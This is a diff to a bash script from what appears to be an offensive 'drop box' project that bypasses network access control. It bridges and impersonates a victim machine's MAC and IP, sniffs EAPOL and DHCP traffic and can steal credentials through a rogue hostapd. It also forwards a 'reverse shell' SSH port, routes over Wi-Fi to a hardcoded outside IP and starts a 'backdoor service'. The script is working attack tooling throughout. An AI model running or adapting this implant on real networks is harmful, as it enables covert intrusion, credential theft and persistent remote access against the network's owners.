@@ -9,7 +9,8 @@ if [ -z "$1" ]
 fi
 
 # Global Vars - ADD TO SOURCE FILE
-
+#GWMAC="00:de:ad:be:ef:00"
+#GWMAC="Testing"
 BRINT=br0 #bridge interface
 SWINT=eth1 #interface of usb2eth plugged into switch
 SWMAC=$(ifconfig $SWINT | grep -i ether | awk '{ print $2 }') #get SWINT MAC address automatically.
@@ -20,11 +21,12 @@ WNET="192.168.19.0/24" #Wireless network block
 DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
 RANGE=61000-62000 #Ports for my traffic on NAT
 RUNAPD=0 #1 - yes steal creds, 0 - no, just don't
-HOSTAPDPATH="/opt/eaphammer/hostapd-eaphammer/hostapd/hostapd-eaphammer"
-HOSTWIREDCONF="/opt/NacBypass2.0/hostapd-wired.conf"
+HOSTAPDPATH="/opt/Drop-Pi/eaphammer/hostapd-eaphammer/hostapd/hostapd-eaphammer"
+HOSTWIREDCONF="/opt//Drop-Pi/NacBypass2.0/hostapd-wired.conf"
 RANDSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
-EAPLOG="/opt/NacBypass2.0/logs/eapol-$RANDSTRING.pcap"
-BOOTLOG="/opt/NacBypass2.0/logs/boot-$RANDSTRING.pcap"
+EAPLOG="/opt/Drop-Pi/NacBypass2.0/logs/eapol-$RANDSTRING.pcap"
+BOOTLOG="/opt/Drop-Pi/NacBypass2.0/logs/boot-$RANDSTRING.pcap"
+ARPLOG="/opt/Drop-Pi/NacBypass2.0/logs/arp-$RANDSTRING.pcap"
 
 ERR="Something is wrong"
 ATTEM=0
@@ -42,7 +44,7 @@ ErrNotifi() {
    echo 500 > /sys/class/leds/led1/delay_on
    echo 500 > /sys/class/leds/led1/delay_off
    sleep 10
-   /opt/NacBypass2.0/NacBypass.sh down
+   /opt/Drop-Pi/NacBypass2.0/NacBypass.sh down
    exit 0;
 }
 
@@ -69,7 +71,9 @@ EAPOLMagic() {
     #if [ -e /tmp/eapol.pcap ]; then
     #   rm /tmp/eapol.pcap
     #fi
+    
     echo "Listening for initial traffic"
+    echo "Listening for intiial traffic" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
     ifconfig $COMPINT 0.0.0.0 up promisc && timeout 10s tcpdump -nne -i $COMPINT -c1 -w $EAPLOG && ifconfig $COMPINT down
     FILESIZEeap=$(wc -c < $EAPLOG)
     if [ $FILESIZEeap -gt 30 ]; then
@@ -85,6 +89,7 @@ EAPOLMagic() {
       return 0
     else
       echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?"
+      echo "Failed to get initial victim traffic, is the machine on? Are you one? Who am I?/n" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       ErrNotifi
     fi
 }
@@ -100,6 +105,7 @@ InitialSetupEbtable() {
     ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC
 
     echo "Enable EAP packet forwarding and bridge nf call"
+    echo "Enable EAP packet forwarding and bridge nf call" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
     echo 8 > /sys/class/net/br0/bridge/group_fwd_mask #forward EAP packets
     MODPQ=$(modprobe br_netfilter)
     echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables
@@ -110,6 +116,7 @@ InitialSetupEbtable() {
     ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE
 
     echo "Bringing up the Bridge"
+    echo "Bringing up the Bridge" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
 }
 
 DHCPSecretSquirrel() {
@@ -118,16 +125,20 @@ DHCPSecretSquirrel() {
        #   rm /tmp/boot.pcap
        #fi
        echo "Resetting Connection"
+       echo "Resetting Connection " >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
        #mii-tool -r $COMPINT
        sleep $TIMESL
        ifconfig $SWINT 0.0.0.0 up promisc
        mii-tool -r $SWINT
        echo "Listening for Traffic"
+       echo "Listening for Traffic" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
        ifconfig $COMPINT 0.0.0.0 up promisc && mii-tool -r $COMPINT && timeout 120s tcpdump -i $COMPINT -s0 -w $BOOTLOG -c1 dst port 68
        FILESIZE=$(wc -c < $BOOTLOG)
        if [ $FILESIZE -le 30 ]; then
            echo "PCAP empty, size: $FILESIZE"
+           echo "PCAP empty, size: $FILESIZE" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Issue getting DHCP info, trying again - $ATTEM of 2"
+           echo "Issue getting DHCP info, trying again - $ATTEM of 2" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            TIMESL=$((TIMESL+30))
            ATTEM=$((ATTEM+1))
            ifconfig $BRINT down && ifconfig $COMPINT down && ifconfig $SWINT down
@@ -135,7 +146,8 @@ DHCPSecretSquirrel() {
            DHCPSecretSquirrel
        else
            echo "Processing packet and setting veriables COMPMAC GWMAC COMIP"
-           GWIP=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "Option 3" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
+           echo "Processing packet and setting veriables COMPMAC GWMAC COMIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           GWIP=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "(3)" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
            COMIP=`tcpdump -r $BOOTLOG -nne -c 1 dst port 68 | awk '{print $3","$4$12}' |cut -f 1-4 -d.| awk -F ',' '{print $3}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
            BROADCOMAC="NOT BROADCAST PACKET"
            if [ $COMIP == "255.255.255.255" ]; then
@@ -148,18 +160,38 @@ DHCPSecretSquirrel() {
                 DHCPSecretSquirrel
              fi
            fi
-           DNSSERV=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "Option 6" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
-           while read -r line; do
+           DNSSERV=`tcpdump -r $BOOTLOG -vvv -nne -s 0 -c 1 dst port 68 | grep "(6)" | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
+	   while read -r line; do
                echo "nameserver $line" >> /etc/resolv.conf
            done <<< "$DNSSERV"
-           echo "Arping the gateway, this may take a second..."
-           GWMAC=`arping -r -S $COMIP -i $BRINT $GWIP | grep -m1 -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+           echo "nameserver 8.8.8.8" >> /etc/resolv.conf
            echo "Gateway IP: $GWIP"
+           echo "Gateway IP: $GWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           echo "Bridge Interface: $BRINT"
+           echo "Bridge Interface: $BRINT" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           echo "Getting MAC address for Gateway"
+           echo "Getting MAC address for Gateway" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           ifconfig $COMPINT 0.0.0.0 up promisc &&  mii-tool -r $COMPINT && timeout 120s tcpdump -i $COMPINT -c1 -w $ARPLOG src host $GWIP and arp and arp[6:2] == 2
+           GWMAC=`tcpdump -r $ARPLOG -vvv -nne -s 0 -c 1 arp and arp[6:2] == 2 | grep "0x0806" | grep "at" | cut -d " " -f 2 | awk '{print $NF}' | grep -m1 -Eo '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+           if [ -z ${GWMAC} ] ; then
+            ERR="Well this is embarrassing, couldn't get Gateway mac"
+            ErrNotifi
+           fi
+           echo "Got the GateWay MAC = $GWMAC"
+           echo "Got the GateWay MAC = $GWMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           echo "Gateway IP: $GWIP"
+           echo "Gateway IP: $GWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Gateway MAC: $GWMAC"
+           echo "Gateway MAC: $GWMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Victim IP: $COMIP"
+           echo "Victim IP: $COMIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Victim MAC: $COMPMAC"
+           echo "Victim MAC: $COMPMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "DNS Server: $DNSSERV"
+           echo "DNS Server: $DNSSERV" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
            echo "Debug purposes: $BROADCOMAC"
+           echo "Debug purposes: $BROADCOMAC" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+           
            return 0
        fi
     else
@@ -181,7 +213,9 @@ GoGoNacBypass() {
     echo timer > /sys/class/leds/led0/trigger
     echo 300 > /sys/class/leds/led0/delay_on
     echo 300 > /sys/class/leds/led0/delay_off
+    echo "" > /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
     echo "laying the ground work"
+    echo "laying the ground work" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
     echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
     sysctl -p
     echo "" > /etc/resolv.conf
@@ -197,14 +231,17 @@ GoGoNacBypass() {
 
       # Create default routes so we can route traffic - all traffic goes to 169.254.66.1 and this traffic gets Layer 2 sent to GWMAC
       echo "Adding default routes"
+      echo "Adding default routes " >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       arp -s -i $BRINT 169.254.66.1 $GWMAC
       route add default gw 169.254.66.1
 
       #SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on 22 (SSH)
-      echo "Setting up SSH reverse shell inbound on BICTIMIP:2222 to ATTACKERIP:22"
+      echo "Setting up SSH reverse shell inbound on VICTIMIP:2222 to ATTACKERIP:22"
+      echo "Setting up SSH reverse shell inbound on VICTIMIP:2222 to ATTACKERIP:22" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
       iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22
 
       echo "Setting up Layer 3 rewrite rules"
+      echo "Setting up Layer 3 rewrite rules" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
 
       #Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
       iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
@@ -212,14 +249,36 @@ GoGoNacBypass() {
       iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
 
       #Check if wireless ap is running, if it is route all traffic over bridge with snat
-      if CheckWireless; then
-           iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p tcp -j SNAT --to $COMIP:$RANGE
-           iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p udp -j SNAT --to $COMIP:$RANGE
-           iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
-           echo 1 > /proc/sys/net/ipv4/ip_forward
-      fi
+      #if CheckWireless; then
+      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p tcp -j SNAT --to $COMIP:$RANGE
+      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p udp -j SNAT --to $COMIP:$RANGE
+      #     iptables -t nat -A POSTROUTING -o $BRINT -s $WNET -p icmp -j SNAT --to $COMIP
+      #     echo 1 > /proc/sys/net/ipv4/ip_forward
+      #fi
+      #echo "Creating route for WIFI dualhomed access to internet."
+      #echo "Creating route for WIFI dualhomed access to internet." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      echo "Creating route for all internal network traffice."
+      echo "Creating route for all internal network traffice." >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      
 
       echo "Time for fun & profit"
+      echo "Time for fun & profit" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      echo "Starting backdoor service"
+      echo "Starting backdoor service" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      echo "Bringing up WLAN0"
+      echo "Bringing up WLAN0" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log 
+      systemctl enable NetworkManager
+      sleep 10
+      systemctl start NetworkManager
+      sleep 10
+      WLANGWIP=`route | grep wlan0 | grep default | cut -d "0" -f 1 | awk '{print $NF}' | grep -Eo '(([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[0-9]{2}|1[0-9]{2}|2[0-4][0-9]|25[0-5])'`
+      
+      echo "Grabbing the WIFI Default GW IP: $WLANGWIP "
+      echo "Grabbing the WIFI Default GW IP: $WLANGWIP" >> /opt/Drop-Pi/NacBypass2.0/logs/NacBypass.log
+      sleep 20
+      ip route add 66.42.94.137/32 via $WLANGWIP dev wlan0
+
+      systemctl start backdoor.service
       ProfitNotifi
    fi
 }
@@ -294,5 +353,9 @@ case "$1" in
        brctl delif $BRINT $SWINT
        brctl delbr $BRINT
     fi
+    echo "Bringing down WLAN0"
+    ifconfig wlan0 down
+    systemctl disable NetworkManager
+    systemctl stop NetworkManager
   ;;
 esac
